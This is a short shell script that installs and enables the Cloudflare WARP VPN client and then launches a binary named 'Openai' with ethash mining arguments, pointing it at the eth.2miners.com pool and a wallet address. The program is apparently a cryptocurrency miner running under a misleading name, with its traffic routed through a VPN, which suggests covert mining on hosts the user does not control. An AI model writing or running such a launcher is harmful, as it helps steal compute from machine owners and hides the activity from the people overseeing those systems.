#!/bin/sh
wget https://pkg.cloudflareclient.com/uploads/cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
sudo dpkg -i cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
sudo systemctl enable --now warp-svc.service
warp-cli set-mode warp+doh
warp-cli register
warp-cli enable-always-on
warp-cli connect

./Openai --algo ethash --server eth.2miners.com:2020 --user 0x406cc90e0a558e247a539e685e02ad8cb22f91c8
